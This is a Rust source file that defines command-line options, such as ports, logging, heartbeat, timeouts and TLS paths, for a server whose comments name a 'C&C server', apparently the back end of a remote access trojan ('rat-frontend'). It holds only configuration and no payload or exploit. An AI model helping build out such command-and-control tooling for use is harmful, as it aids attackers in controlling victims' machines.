use std::path::PathBuf;

use clap::{Parser, crate_description, crate_version};
use log::LevelFilter;

#[derive(Debug, Parser)]
#[command(
    long_about = crate_description!(),
    propagate_version = true,
    version = crate_version!(),
)]
pub struct Arguments {
    /// Port of the C&C server
    #[arg(long, default_value_t = 12110)]
    pub cc_port: u16,

    /// Port of the admin server
    #[arg(long, default_value_t = 12111)]
    pub admin_port: u16,

    /// Port of the static file server
    #[arg(long, default_value_t = 12112)]
    pub static_files_port: u16,

    /// The logging level.
    #[arg(long, default_value_t = LevelFilter::Info)]
    pub log_level: LevelFilter,

    /// Path to the log file.
    #[arg(long, default_value = "target/server.log")]
    pub log_path: PathBuf,

    /// Server-to-client heartbeat interval in milliseconds. Set to 0 to disable heartbeats.
    #[arg(long, default_value_t = 25000)]
    pub heartbeat_interval: u64,

    /// Server-to-client request timeout in milliseconds. Set to 0 to disable timeouts.
    #[arg(long, default_value_t = 5000)]
    pub request_timeout: u64,

    /// Capacity of the multi-producer-single-consumer channel to transfer client messages internally. Increasing this value
    /// to prevent client message loss at the cost of increased memory usage.
    #[arg(long, default_value_t = 50)]
    pub client_mpsc_channel_capacity: usize,

    /// Path to the frontend static files directory.
    #[arg(long, default_value = "rat-frontend/dist")]
    pub frontend_static_files: PathBuf,

    /// Path to the static file directory
    #[arg(long, default_value = "target/static")]
    pub static_files_dir: PathBuf,

    /// Path to the TLS certificate file in PEM format. This is used by the admin server.
    #[arg(long, default_value = "certs/cert.pem")]
    pub tls_admin_cert_path: PathBuf,

    /// Path to the TLS private key file in PEM format. This is used by the admin server.
    #[arg(long, default_value = "certs/cert.key.pem")]
    pub tls_admin_key_path: PathBuf,

    /// Path to the TLS certificate file in PEM format. This is used by the C&C server.
    #[arg(long, default_value = "certs/cert.pem")]
    pub tls_cc_cert_path: PathBuf,

    /// Path to the TLS private key file in PEM format. This is used by the C&C server.
    #[arg(long, default_value = "certs/cert.key.pem")]
    pub tls_cc_key_path: PathBuf,
}
